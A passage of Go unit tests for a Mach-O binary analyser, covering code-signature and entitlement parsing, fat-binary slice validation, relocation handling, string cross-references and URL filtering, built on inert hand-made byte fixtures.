		{name: "arm unaligned", cpu: macho.CpuArm64, data: append([]byte{0}, []byte{0, 0, 0, 0x94}...), reloc: macho.Reloc{Addr: 1, Type: uint8(macho.ARM64_RELOC_BRANCH26), Len: 2, Pcrel: true, Extern: true}},
	} {
		t.Run(test.name, func(t *testing.T) {
			got := fixture(test.cpu, test.data, test.reloc, macho.Symbol{Name: "_system", Type: 0x01}, test.dataRanges)
			if len(got.Features) != 0 || len(got.Operations) != 0 {
				t.Fatalf("non-call relocation acquired semantics: features=%#v operations=%#v", got.Features, got.Operations)
			}
		})
	}
	armCall := []byte{0, 0, 0, 0x94}
	armReloc := macho.Reloc{Addr: 0, Type: uint8(macho.ARM64_RELOC_BRANCH26), Len: 2, Pcrel: true, Extern: true}
	arm := fixture(macho.CpuArm64, armCall, armReloc, macho.Symbol{Name: "_system", Type: 0x01}, nil)
	if len(arm.Features) != 1 || len(arm.Operations) != 1 || arm.Evidence[0].VA != 0x1000 {
		t.Fatalf("arm64 BL relocation positive was lost: %#v", arm)
	}
}

func TestTextSectionRequiresExecutableMappingForLoadedImage(t *testing.T) {
	section := testMachOSection("__text", 0x1000, []byte{0xc3})
	section.Seg = "__TEXT"
	fixture := func(fileType macho.Type, prot uint32) *macho.File {
		return &macho.File{
			FileHeader: macho.FileHeader{Type: fileType},
			Loads: []macho.Load{&macho.Segment{SegmentHeader: macho.SegmentHeader{
				Name: "__TEXT", Addr: 0x1000, Memsz: 1, Filesz: 1, Prot: prot,
			}}},
			Sections: []*macho.Section{section},
		}
	}
	if got, _ := textSection(fixture(macho.TypeExec, 0x3)); got != nil {
		t.Fatalf("non-executable loaded mapping acquired code semantics: %#v", got)
	}
	if got, index := textSection(fixture(macho.TypeExec, 0x5)); got != section || index != 1 {
		t.Fatalf("executable loaded mapping was lost: %#v index=%d", got, index)
	}
	if got, index := textSection(fixture(macho.TypeObj, 0)); got != section || index != 1 {
		t.Fatalf("relocatable instruction section was lost: %#v index=%d", got, index)
	}
	wrongFirst := fixture(macho.TypeExec, 0x3)
	wrongFirst.Loads = append([]macho.Load{
		&macho.Segment{SegmentHeader: macho.SegmentHeader{Name: "__TEXT", Addr: 0x2000, Memsz: 1, Offset: 0x100, Filesz: 1, Prot: 0x5}},
	}, wrongFirst.Loads...)
	if got, _ := textSection(wrongFirst); got != nil {
		t.Fatalf("execute permission from a different same-name segment authorized non-executable text: %#v", got)
	}
	executableOwner := fixture(macho.TypeExec, 0x5)
	executableOwner.Loads = append([]macho.Load{
		&macho.Segment{SegmentHeader: macho.SegmentHeader{Name: "__TEXT", Addr: 0x2000, Memsz: 1, Offset: 0x100, Filesz: 1, Prot: 0x3}},
	}, executableOwner.Loads...)
	if got, _ := textSection(executableOwner); got != section {
		t.Fatalf("unrelated first same-name segment hid the executable owner: %#v", got)
	}
	if got := textSegmentBase(executableOwner, section); got != 0x1000 {
		t.Fatalf("function-start base came from unrelated same-name segment: %#x", got)
	}
}

func TestFunctionRangesRequireDefinedSectionSymbols(t *testing.T) {
	text := testMachOSection("__text", 0x1000, bytes.Repeat([]byte{0x90}, 0x20))
	text.Seg = "__TEXT"
	for _, test := range []struct {
		name   string
		symbol macho.Symbol
		want   string
	}{
		{name: "defined section", symbol: macho.Symbol{Name: "_main", Type: 0x0e, Sect: 1, Value: 0x1000}, want: "main"},
		{name: "undefined", symbol: macho.Symbol{Name: "_main", Type: 0x01, Sect: 1, Value: 0x1000}, want: "sub_1000"},
		{name: "stab", symbol: macho.Symbol{Name: "_main", Type: 0xee, Sect: 1, Value: 0x1000}, want: "sub_1000"},
		{name: "absolute", symbol: macho.Symbol{Name: "_main", Type: 0x02, Sect: 1, Value: 0x1000}, want: "sub_1000"},
	} {
		t.Run(test.name, func(t *testing.T) {
			file := &macho.File{Symtab: &macho.Symtab{Syms: []macho.Symbol{test.symbol}}}
			functions, _, _ := functionRangesBounded(file, text, 1, nil)
			if len(functions) != 1 || functions[0].Name != test.want {
				t.Fatalf("function ranges = %#v, want one %q boundary", functions, test.want)
			}
		})
	}
}

func TestMachORandomAccessReadsDoNotMaterializeWholeSections(t *testing.T) {
	pointerData := make([]byte, 8)
	binary.LittleEndian.PutUint64(pointerData, 0x1122334455667788)
	pointerSection := &macho.Section{
		SectionHeader: macho.SectionHeader{Name: "__const", Addr: 0x1000, Size: 32 << 20},
		ReaderAt:      &maxReadSizeReaderAt{data: pointerData, max: 8},
	}
	stringSection := &macho.Section{
		SectionHeader: macho.SectionHeader{Name: "__cstring", Addr: 0x2000, Size: 32 << 20},
		ReaderAt:      &maxReadSizeReaderAt{data: []byte("hello\x00"), max: 64},
	}
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{pointerSection, stringSection}}
	index := newMachOSectionIndex(file)

	if got, ok := readPointerAtVAIndexed(file, index, 0x1000); !ok || got != 0x1122334455667788 {
		t.Fatalf("bounded pointer read = %#x, %v", got, ok)
	}
	if got, ok := readCStringAtVAIndexed(index, 0x2000, 64); !ok || got != "hello" {
		t.Fatalf("bounded string read = %q, %v", got, ok)
	}
}

type maxReadSizeReaderAt struct {
	data []byte
	max  int
}

func (reader *maxReadSizeReaderAt) ReadAt(dst []byte, offset int64) (int, error) {
	if len(dst) > reader.max || offset < 0 {
		return 0, io.ErrShortBuffer
	}
	if offset >= int64(len(reader.data)) {
		return 0, io.EOF
	}
	n := copy(dst, reader.data[offset:])
	if n < len(dst) {
		return n, io.EOF
	}
	return n, nil
}

func TestMachOEntitlementStringFallbackUsesSliceImage(t *testing.T) {
	content := artifact.Content{
		NodeID:      "node-1",
		LogicalPath: "sample",
		Data:        []byte("com.apple.security.get-task-allow"),
	}
	var graph behavior.Graph
	extractEntitlementStrings(&graph, content, "arm64", []byte("no entitlement strings here"), false)
	if len(graph.ArtifactProperties) != 0 {
		t.Fatalf("entitlement fallback should use the architecture slice image, not full content: %#v", graph.ArtifactProperties)
	}

	extractEntitlementStrings(&graph, content, "arm64", []byte("com.apple.security.get-task-allow"), false)
	if len(graph.ArtifactProperties) != 1 || graph.ArtifactProperties[0].Value != "com.apple.security.get-task-allow" || graph.ArtifactProperties[0].Support != behavior.SupportHeuristic {
		t.Fatalf("missing slice-scoped entitlement fallback: %#v", graph.ArtifactProperties)
	}
}

func TestDecodeFunctionStartsWorkCaps(t *testing.T) {
	starts, truncated := decodeFunctionStartsBounded([]byte{1, 1, 1, 0}, 0, 0, 100, 4, 2, 10)
	if !truncated || len(starts) != 2 || starts[0] != 1 || starts[1] != 2 {
		t.Fatalf("record-capped starts = %#v, %v; want [1 2], true", starts, truncated)
	}

	starts, truncated = decodeFunctionStartsBounded([]byte{1, 1, 0}, 0, 0, 100, 1, 10, 10)
	if !truncated || len(starts) != 1 || starts[0] != 1 {
		t.Fatalf("byte-capped starts = %#v, %v; want [1], true", starts, truncated)
	}
}

func TestCodeSignatureBlobIndexIsBoundedAndDeduplicated(t *testing.T) {
	const blobOffset = 44
	data := make([]byte, blobOffset+8)
	binary.BigEndian.PutUint32(data[0:4], csMagicSuperBlob)
	binary.BigEndian.PutUint32(data[4:8], uint32(len(data)))
	binary.BigEndian.PutUint32(data[8:12], 4)
	for i := 0; i < 3; i++ {
		entry := 12 + i*8
		binary.BigEndian.PutUint32(data[entry:entry+4], csSlotCodeDirectory)
		binary.BigEndian.PutUint32(data[entry+4:entry+8], blobOffset)
	}
	binary.BigEndian.PutUint32(data[36:40], csSlotDerEntitlements)
	binary.BigEndian.PutUint32(data[40:44], blobOffset)
	binary.BigEndian.PutUint32(data[blobOffset:blobOffset+4], csMagicCodeDirectory)
	binary.BigEndian.PutUint32(data[blobOffset+4:blobOffset+8], 8)

	blobs, truncated := codeSignatureBlobsBounded(data, 4, 4)
	if truncated || len(blobs) != 2 || blobs[0].kind != "code-directory" || blobs[1].kind != "der-entitlements" {
		t.Fatalf("deduplicated signature blobs = %#v, %v", blobs, truncated)
	}
	blobs, truncated = codeSignatureBlobsBounded(data, 2, 4)
	if !truncated || len(blobs) != 1 {
		t.Fatalf("slot-capped signature blobs = %#v, %v; want one blob and truncation", blobs, truncated)
	}
	blobs, truncated = codeSignatureBlobsBounded(data, 4, 1)
	if !truncated || len(blobs) != 1 {
		t.Fatalf("blob-capped signature blobs = %#v, %v; want one blob and truncation", blobs, truncated)
	}
}

func TestCompleteCodeSignatureWithoutEntitlementSlotsSuppressesRawFallback(t *testing.T) {
	signature := testAdHocCodeSignature()
	image := append([]byte("com.apple.security.get-task-allow\x00"), signature...)
	file := testMachOFileWithCodeSignature(len(image)-len(signature), len(signature))
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample", Data: image}
	var graph behavior.Graph

	absent := extractCodeSignature(&graph, content, file, "arm64", image)
	if !absent {
		t.Fatal("complete ad-hoc code signature without entitlement slots did not establish absence")
	}
	extractEntitlementStrings(&graph, content, "arm64", image, absent)
	for _, item := range graph.ArtifactProperties {
		if item.Kind == "entitlement" {
			t.Fatalf("raw constant-pool entitlement survived conclusive signature parsing: %#v", graph.ArtifactProperties)
		}
	}
}

func TestCompleteCMSSignatureWithoutEntitlementSlotsSuppressesRawFallback(t *testing.T) {
	signature := testCodeSignatureWithCMSSignature()
	image := append([]byte("com.apple.security.get-task-allow\x00"), signature...)
	file := testMachOFileWithCodeSignature(len(image)-len(signature), len(signature))
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample", Data: image}
	var graph behavior.Graph

	absent := extractCodeSignature(&graph, content, file, "arm64", image)
	if !absent {
		t.Fatal("complete CMS signature without entitlement slots did not establish absence")
	}
	extractEntitlementStrings(&graph, content, "arm64", image, absent)
	for _, item := range graph.ArtifactProperties {
		if item.Kind == "entitlement" {
			t.Fatalf("CMS signature slot was misclassified as an alternate CodeDirectory: %#v", graph.ArtifactProperties)
		}
	}
}

func TestMalformedAlternateCodeDirectoryRetainsRawEntitlementFallback(t *testing.T) {
	signature := testCodeSignatureWithAuxiliaryBlob(csSlotAlternateCodeDirectories, 0xfade0b01)
	image := append([]byte("com.apple.security.get-task-allow\x00"), signature...)
	file := testMachOFileWithCodeSignature(len(image)-len(signature), len(signature))
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample", Data: image}
	var graph behavior.Graph

	absent := extractCodeSignature(&graph, content, file, "arm64", image)
	if absent {
		t.Fatal("malformed alternate CodeDirectory incorrectly established entitlement absence")
	}
	extractEntitlementStrings(&graph, content, "arm64", image, absent)
	if !hasArtifactProperty(graph.ArtifactProperties, "entitlement", "com.apple.security.get-task-allow", behavior.SupportHeuristic) {
		t.Fatalf("raw fallback did not run after malformed alternate CodeDirectory: %#v", graph.ArtifactProperties)
	}
}

func TestIncompleteCodeSignatureRetainsRawEntitlementFallback(t *testing.T) {
	signature := testAdHocCodeSignature()
	binary.BigEndian.PutUint32(signature[4:8], uint32(len(signature)+1))
	image := append([]byte("com.apple.security.get-task-allow\x00"), signature...)
	file := testMachOFileWithCodeSignature(len(image)-len(signature), len(signature))
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample", Data: image}
	var graph behavior.Graph

	absent := extractCodeSignature(&graph, content, file, "arm64", image)
	if absent {
		t.Fatal("truncated code signature incorrectly established entitlement absence")
	}
	extractEntitlementStrings(&graph, content, "arm64", image, absent)
	if !hasArtifactProperty(graph.ArtifactProperties, "entitlement", "com.apple.security.get-task-allow", behavior.SupportHeuristic) {
		t.Fatalf("raw entitlement fallback did not run for incomplete signature: %#v", graph.ArtifactProperties)
	}
}

func TestDEREntitlementSlotRetainsRawEntitlementFallback(t *testing.T) {
	signature := testCodeSignatureWithDEREntitlements()
	image := append([]byte("com.apple.security.network.client\x00"), signature...)
	file := testMachOFileWithCodeSignature(len(image)-len(signature), len(signature))
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample", Data: image}
	var graph behavior.Graph

	absent := extractCodeSignature(&graph, content, file, "arm64", image)
	if absent {
		t.Fatal("signature with a DER entitlement slot incorrectly established entitlement absence")
	}
	extractEntitlementStrings(&graph, content, "arm64", image, absent)
	if !hasArtifactProperty(graph.ArtifactProperties, "entitlements-der", "present", behavior.SupportDirect) {
		t.Fatalf("missing DER entitlement presence: %#v", graph.ArtifactProperties)
	}
	if !hasArtifactProperty(graph.ArtifactProperties, "entitlement", "com.apple.security.network.client", behavior.SupportHeuristic) {
		t.Fatalf("raw fallback should remain available when DER keys are not decoded: %#v", graph.ArtifactProperties)
	}
}

func testMachOFileWithCodeSignature(offset, size int) *macho.File {
	raw := make([]byte, 16)
	binary.LittleEndian.PutUint32(raw[0:4], lcCodeSignature)
	binary.LittleEndian.PutUint32(raw[4:8], uint32(len(raw)))
	binary.LittleEndian.PutUint32(raw[8:12], uint32(offset))
	binary.LittleEndian.PutUint32(raw[12:16], uint32(size))
	return &macho.File{
		ByteOrder: binary.LittleEndian,
		Loads:     []macho.Load{macho.LoadBytes(raw)},
	}
}

func testAdHocCodeSignature() []byte {
	identifier := []byte("com.example.maratus-test\x00")
	codeDirectory := make([]byte, 44+len(identifier))
	binary.BigEndian.PutUint32(codeDirectory[0:4], csMagicCodeDirectory)
	binary.BigEndian.PutUint32(codeDirectory[4:8], uint32(len(codeDirectory)))
	binary.BigEndian.PutUint32(codeDirectory[8:12], 0x20100)
	binary.BigEndian.PutUint32(codeDirectory[12:16], 0x2) // CS_ADHOC
	binary.BigEndian.PutUint32(codeDirectory[16:20], uint32(len(codeDirectory)))
	binary.BigEndian.PutUint32(codeDirectory[20:24], 44)
	codeDirectory[36] = 32 // SHA-256 digest size.
	codeDirectory[37] = 2  // SHA-256 digest type.
	codeDirectory[39] = 12 // 4 KiB page size as log2.
	copy(codeDirectory[44:], identifier)

	const indexEnd = 20
	signature := make([]byte, indexEnd+len(codeDirectory))
	binary.BigEndian.PutUint32(signature[0:4], csMagicSuperBlob)
	binary.BigEndian.PutUint32(signature[4:8], uint32(len(signature)))
	binary.BigEndian.PutUint32(signature[8:12], 1)
	binary.BigEndian.PutUint32(signature[12:16], csSlotCodeDirectory)
	binary.BigEndian.PutUint32(signature[16:20], indexEnd)
	copy(signature[indexEnd:], codeDirectory)
	return signature
}

func testCodeSignatureWithDEREntitlements() []byte {
	return testCodeSignatureWithAuxiliaryBlob(csSlotDerEntitlements, 0xfade7172)
}

func testCodeSignatureWithCMSSignature() []byte {
	signature := testCodeSignatureWithAuxiliaryBlob(csSlotCMSSignature, 0xfade0b01)
	const codeDirectoryOffset = 28
	binary.BigEndian.PutUint32(signature[codeDirectoryOffset+12:codeDirectoryOffset+16], 0)
	return signature
}

func testCodeSignatureWithAuxiliaryBlob(slot, magic uint32) []byte {
	adHoc := testAdHocCodeSignature()
	codeDirectory := adHoc[20:]
	auxiliary := make([]byte, 8)
	binary.BigEndian.PutUint32(auxiliary[0:4], magic)
	binary.BigEndian.PutUint32(auxiliary[4:8], uint32(len(auxiliary)))

	const indexEnd = 28
	signature := make([]byte, indexEnd+len(codeDirectory)+len(auxiliary))
	binary.BigEndian.PutUint32(signature[0:4], csMagicSuperBlob)
	binary.BigEndian.PutUint32(signature[4:8], uint32(len(signature)))
	binary.BigEndian.PutUint32(signature[8:12], 2)
	binary.BigEndian.PutUint32(signature[12:16], csSlotCodeDirectory)
	binary.BigEndian.PutUint32(signature[16:20], indexEnd)
	binary.BigEndian.PutUint32(signature[20:24], slot)
	binary.BigEndian.PutUint32(signature[24:28], uint32(indexEnd+len(codeDirectory)))
	copy(signature[indexEnd:], codeDirectory)
	copy(signature[indexEnd+len(codeDirectory):], auxiliary)
	return signature
}

func hasArtifactProperty(items []behavior.ArtifactProperty, kind, value string, support behavior.Support) bool {
	for _, item := range items {
		if item.Kind == kind && item.Value == value && item.Support == support {
			return true
		}
	}
	return false
}

func TestExtractMachOParsesAllValidatedFatFormats(t *testing.T) {
	for _, test := range []struct {
		name  string
		order binary.ByteOrder
		is64  bool
	}{
		{name: "fat32-big-endian", order: binary.BigEndian},
		{name: "fat32-little-endian", order: binary.LittleEndian},
		{name: "fat64-big-endian", order: binary.BigEndian, is64: true},
		{name: "fat64-little-endian", order: binary.LittleEndian, is64: true},
	} {
		t.Run(test.name, func(t *testing.T) {
			inner := append(testExtractThinMachO(macho.CpuArm64, 0), []byte("indexed-slice-overlay")...)
			data := append(testExtractFatMachO(test.order, test.is64, inner), []byte("outer-overlay")...)
			_, slices, err := artifact.PreflightMachOSlices(data)
			if err != nil || len(slices) != 1 {
				t.Fatalf("fixture preflight = %#v, %v", slices, err)
			}
			var graph behavior.Graph
			ExtractMachO(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "universal", Data: data}, artifact.Options{})

			if !hasFeatureArchitecture(&graph, "macho.filetype", macho.TypeExec.String(), "arm64") {
				t.Fatalf("validated fat slice was not extracted: features=%#v coverage=%#v", graph.Features, graph.Coverage)
			}
			var header *behavior.Evidence
			for index := range graph.Evidence {
				if graph.Evidence[index].Method == "macho-header" && graph.Evidence[index].Arch == "arm64" {
					header = &graph.Evidence[index]
					break
				}
			}
			if header == nil || !header.ByteOffsetKnown() || header.Offset != int64(slices[0].Offset) {
				t.Fatalf("fat-slice header offset = %#v, want node-relative offset %#x", header, slices[0].Offset)
			}
			for _, coverage := range graph.Coverage {
				if coverage.AnalysisArea == "macho" && strings.Contains(coverage.Detail, "parse failed") {
					t.Fatalf("validated fat format reached failure coverage: %#v", coverage)
				}
			}
		})
	}
}

func TestMachOStringXrefSeparatesAndComposesReferenceAndLiteralOffsets(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "universal", ByteOffsetBase: 0x100}
	lookup := newMachOCallLookup(&graph, content, "arm64")
	lookup.sectionIndex = newMachOSectionIndex(&macho.File{Sections: []*macho.Section{{
		SectionHeader: macho.SectionHeader{Name: "__text", Addr: 0x1000, Size: 0x20, Offset: 0x40},
	}}})
	addMachOStringXrefIndexed(lookup, machoStringXref{
		RefVA:          0x1004,
		RefOffset:      0x44,
		RefOffsetKnown: true,
		Function:       machoFunction{Name: "main", Start: 0x1000, End: 0x1020},
		Literal:        machoStringLiteral{VA: 0x2000, Offset: 0x80, Kind: "url", Value: "https://example.invalid/payload"},
	})

	if len(graph.Evidence) != 2 || len(graph.Features) != 1 || len(graph.Features[0].EvidenceIDs) != 2 {
		t.Fatalf("xref lineage was not retained as two locations: evidence=%#v features=%#v", graph.Evidence, graph.Features)
	}
	literal, reference := graph.Evidence[0], graph.Evidence[1]
	if literal.Method != "macho-literal" || literal.Offset != 0x180 || !literal.ByteOffsetKnown() || literal.VA != 0x2000 {
		t.Fatalf("literal location = %#v, want slice base plus literal offset", literal)
	}
	if reference.Method != "macho-xref" || reference.Offset != 0x144 || !reference.ByteOffsetKnown() || reference.VA != 0x1004 {
		t.Fatalf("reference location = %#v, want slice base plus instruction offset", reference)
	}
}

func TestMachOStringXrefSuppressesFeatureWhenEvidencePairIsIncomplete(t *testing.T) {
	graph := behavior.Graph{EvidenceLimit: 1}
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:          0x1004,
		RefOffset:      4,
		RefOffsetKnown: true,
		Function:       machoFunction{Name: "main", Start: 0x1000, End: 0x1020},
		Literal:        machoStringLiteral{VA: 0x2000, Offset: 0x80, Kind: "url", Value: "https://example.invalid/payload"},
	})

	if len(graph.Evidence) != 1 || len(graph.Features) != 0 {
		t.Fatalf("an incomplete xref evidence pair must not publish a feature: evidence=%#v features=%#v", graph.Evidence, graph.Features)
	}
	if graph.EvidenceLimitDrops != 1 {
		t.Fatalf("missing reference evidence should be accounted as a budget drop: %#v", graph)
	}
	graph.FinalizeLimits()
	if len(graph.Coverage) != 1 || graph.Coverage[0].Status != "partial" {
		t.Fatalf("evidence exhaustion should remain explicit: %#v", graph.Coverage)
	}
}

func TestAnnotateMachOStringXrefOffsetsUsesScannedTextSection(t *testing.T) {
	xrefs := []machoStringXref{{RefVA: 0x1014}}
	annotateMachOStringXrefOffsets(xrefs, &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: 0x40, Offset: 0x250}})
	if !xrefs[0].RefOffsetKnown || xrefs[0].RefOffset != 0x264 {
		t.Fatalf("reference byte offset = %#v, want the exact scanned text-section location", xrefs[0])
	}
}

func TestExtractMachONativeParsesEveryFatSliceBeforeEmittingBehavior(t *testing.T) {
	first := testExtractThinMachO(macho.CpuArm64, 0)
	malformedRpath := make([]byte, 8)
	binary.LittleEndian.PutUint32(malformedRpath[0:4], uint32(macho.LoadCmdRpath))
	binary.LittleEndian.PutUint32(malformedRpath[4:8], uint32(len(malformedRpath)))
	second := testExtractThinMachO(macho.CpuAmd64, 3, malformedRpath)
	data := append(testExtractFatMachO(binary.LittleEndian, true, first, second), []byte("outer-overlay")...)

	if isFat, err := artifact.PreflightMachO(data); !isFat || err != nil {
		t.Fatalf("fixture should pass bounded structural preflight: isFat=%v err=%v", isFat, err)
	}
	var graph behavior.Graph
	ExtractMachO(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "malformed-universal", Data: data}, artifact.Options{})
	if len(graph.Coverage) != 1 || graph.Coverage[0].Status != "partial" || !strings.Contains(graph.Coverage[0].Detail, "architecture 1 parse failed after structure validation") {
		t.Fatalf("missing native thin-slice parse failure coverage: %#v", graph.Coverage)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("earlier fat slice emitted behavior before all native slices parsed: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestExtractMachOPreflightRejectionAddsPartialCoverage(t *testing.T) {
	data := make([]byte, 8)
	binary.BigEndian.PutUint32(data[0:4], macho.MagicFat)
	binary.BigEndian.PutUint32(data[4:8], ^uint32(0))
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample", Data: data}

	ExtractMachO(&graph, content, artifact.Options{})
	if len(graph.Coverage) != 2 || graph.Coverage[0].Status != "partial" || !strings.Contains(graph.Coverage[0].Detail, "structure validation rejected") {
		t.Fatalf("missing explicit structure-validation coverage: %#v", graph.Coverage)
	}
}

func testExtractThinMachO(cpu macho.Cpu, subCPU uint32, commands ...[]byte) []byte {
	commandBytes := 0
	for _, command := range commands {
		commandBytes += len(command)
	}
	data := make([]byte, 32, 32+commandBytes)
	binary.LittleEndian.PutUint32(data[0:4], macho.Magic64)
	binary.LittleEndian.PutUint32(data[4:8], uint32(cpu))
	binary.LittleEndian.PutUint32(data[8:12], subCPU)
	binary.LittleEndian.PutUint32(data[12:16], uint32(macho.TypeExec))
	binary.LittleEndian.PutUint32(data[16:20], uint32(len(commands)))
	binary.LittleEndian.PutUint32(data[20:24], uint32(commandBytes))
	for _, command := range commands {
		data = append(data, command...)
	}
	return data
}

func testExtractFatMachO(order binary.ByteOrder, is64 bool, slices ...[]byte) []byte {
	const fatMagic64 = 0xcafebabf
	entrySize := 20
	magic := uint32(macho.MagicFat)
	if is64 {
		entrySize = 32
		magic = fatMagic64
	}
	tableEnd := 8 + entrySize*len(slices)
	totalSize := tableEnd
	for _, slice := range slices {
		totalSize += len(slice)
	}
	data := make([]byte, totalSize)
	order.PutUint32(data[0:4], magic)
	order.PutUint32(data[4:8], uint32(len(slices)))
	offset := tableEnd
	for index, slice := range slices {
		entry := 8 + index*entrySize
		order.PutUint32(data[entry:entry+4], binary.LittleEndian.Uint32(slice[4:8]))
		order.PutUint32(data[entry+4:entry+8], binary.LittleEndian.Uint32(slice[8:12]))
		if is64 {
			order.PutUint64(data[entry+8:entry+16], uint64(offset))
			order.PutUint64(data[entry+16:entry+24], uint64(len(slice)))
		} else {
			order.PutUint32(data[entry+8:entry+12], uint32(offset))
			order.PutUint32(data[entry+12:entry+16], uint32(len(slice)))
		}
		copy(data[offset:], slice)
		offset += len(slice)
	}
	return data
}

func TestExtractMachORejectsOverflowedUndefinedSymbolRangeWithoutPanic(t *testing.T) {
	const (
		headerSize   = 32
		symtabSize   = 24
		dysymtabSize = 80
	)
	symoff := headerSize + symtabSize + dysymtabSize
	stroff := symoff + 16
	data := make([]byte, stroff+1)
	binary.LittleEndian.PutUint32(data[0:4], macho.Magic64)
	binary.LittleEndian.PutUint32(data[4:8], uint32(macho.CpuArm64))
	binary.LittleEndian.PutUint32(data[12:16], uint32(macho.TypeExec))
	binary.LittleEndian.PutUint32(data[16:20], 2)
	binary.LittleEndian.PutUint32(data[20:24], symtabSize+dysymtabSize)
	symtab := data[headerSize : headerSize+symtabSize]
	binary.LittleEndian.PutUint32(symtab[0:4], uint32(macho.LoadCmdSymtab))
	binary.LittleEndian.PutUint32(symtab[4:8], symtabSize)
	binary.LittleEndian.PutUint32(symtab[8:12], uint32(symoff))
	binary.LittleEndian.PutUint32(symtab[12:16], 1)
	binary.LittleEndian.PutUint32(symtab[16:20], uint32(stroff))
	binary.LittleEndian.PutUint32(symtab[20:24], 1)
	dysymtab := data[headerSize+symtabSize : headerSize+symtabSize+dysymtabSize]
	binary.LittleEndian.PutUint32(dysymtab[0:4], uint32(macho.LoadCmdDysymtab))
	binary.LittleEndian.PutUint32(dysymtab[4:8], dysymtabSize)
	binary.LittleEndian.PutUint32(dysymtab[24:28], 1)
	binary.LittleEndian.PutUint32(dysymtab[28:32], ^uint32(0))

	var graph behavior.Graph
	ExtractMachO(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "overflow", Data: data}, artifact.Options{})
	if len(graph.Coverage) != 2 || graph.Coverage[0].Status != "partial" || !strings.Contains(graph.Coverage[0].Detail, "undefined symbol range") {
		t.Fatalf("overflowed DYSYMTAB was not rejected before debug/macho: %#v", graph.Coverage)
	}
}

func TestExtractMachORejectsFatOuterInnerCPUMismatch(t *testing.T) {
	inner := make([]byte, 32)
	binary.LittleEndian.PutUint32(inner[0:4], macho.Magic64)
	binary.LittleEndian.PutUint32(inner[4:8], uint32(macho.CpuArm64))
	binary.LittleEndian.PutUint32(inner[12:16], uint32(macho.TypeExec))
	const sliceOffset = 28
	data := make([]byte, sliceOffset, sliceOffset+len(inner))
	binary.BigEndian.PutUint32(data[0:4], macho.MagicFat)
	binary.BigEndian.PutUint32(data[4:8], 1)
	binary.BigEndian.PutUint32(data[8:12], uint32(macho.CpuAmd64))
	binary.BigEndian.PutUint32(data[12:16], 3)
	binary.BigEndian.PutUint32(data[16:20], sliceOffset)
	binary.BigEndian.PutUint32(data[20:24], uint32(len(inner)))
	data = append(data, inner...)

	var graph behavior.Graph
	ExtractMachO(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "mismatch", Data: data}, artifact.Options{})
	if len(graph.Coverage) != 2 || graph.Coverage[0].Status != "partial" || !strings.Contains(graph.Coverage[0].Detail, "disagrees with inner slice") {
		t.Fatalf("fat CPU mismatch was not rejected with explicit coverage: %#v", graph.Coverage)
	}
	if len(graph.Features) != 0 || len(graph.Operations) != 0 {
		t.Fatalf("fat CPU mismatch was decoded or labeled: features=%#v operations=%#v", graph.Features, graph.Operations)
	}
}

func TestASCIIStringRunsPreserveOffsets(t *testing.T) {
	runs, truncated := asciiStringRuns([]byte("\x00abc\x00https://example.invalid/p\x00"), 3)
	if truncated {
		t.Fatal("small string input should not be truncated")
	}
	if len(runs) != 2 {
		t.Fatalf("asciiStringRuns() = %#v, want two strings", runs)
	}
	if runs[0].Offset != 1 || runs[0].Value != "abc" {
		t.Fatalf("first run = %#v", runs[0])
	}
	if runs[1].Offset != 5 || runs[1].Value != "https://example.invalid/p" {
		t.Fatalf("second run = %#v", runs[1])
	}
}

func TestOffsetInRanges(t *testing.T) {
	ranges := []byteRange{{start: 10, end: 20}}
	for _, offset := range []int{10, 15, 19} {
		if !offsetInRanges(offset, ranges) {
			t.Fatalf("offset %d should be inside %#v", offset, ranges)
		}
	}
	for _, offset := range []int{9, 20, 21} {
		if offsetInRanges(offset, ranges) {
			t.Fatalf("offset %d should be outside %#v", offset, ranges)
		}
	}
}

func TestMachOStringSkipRangesExcludeAndMergeDebugSections(t *testing.T) {
	file := &macho.File{Sections: []*macho.Section{
		{SectionHeader: macho.SectionHeader{Offset: 10, Size: 10, Flags: machoSectionAttributeDebug}},
		{SectionHeader: macho.SectionHeader{Offset: 20, Size: 5, Flags: machoSectionAttributeDebug}},
		{SectionHeader: macho.SectionHeader{Offset: 30, Size: 5}},
		{SectionHeader: macho.SectionHeader{Offset: 62, Size: 8, Flags: machoSectionAttributeDebug}},
	}}
	ranges := machoStringSkipRanges(file, 64)
	if len(ranges) != 1 || ranges[0] != (byteRange{start: 10, end: 25}) {
		t.Fatalf("debug skip ranges = %#v", ranges)
	}
	for _, offset := range []int{10, 19, 20, 24} {
		if !offsetInRanges(offset, ranges) {
			t.Fatalf("debug offset %d not skipped", offset)
		}
	}
	for _, offset := range []int{9, 25, 32, 63} {
		if offsetInRanges(offset, ranges) {
			t.Fatalf("non-debug offset %d skipped", offset)
		}
	}
}

func TestNormalizeMachOURLSuppressesCommonStaticDocs(t *testing.T) {
	if got, ok := normalizeStaticURL("https://curl.se/docs/sslcerts.html"); ok {
		t.Fatalf("curl documentation URL should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://curl.se/libcurl/c/curl_easy_setopt.html"); ok {
		t.Fatalf("libcurl documentation URL should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://docs.rs/getrandom#nodejs-es-module-support"); ok {
		t.Fatalf("docs.rs documentation URL should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://tauri.app/docs/api/config#tauri.allowlist"); ok {
		t.Fatalf("Tauri documentation URL should be filtered, got %q", got)
	}
	if got, ok := normalizeStaticURL("https://tauri.app/v1/api/config/#securityconfig.dangerousremotedomainipcaccess"); ok {
		t.Fatalf("Tauri API documentation URL should be filtered, got %q", got)
	}
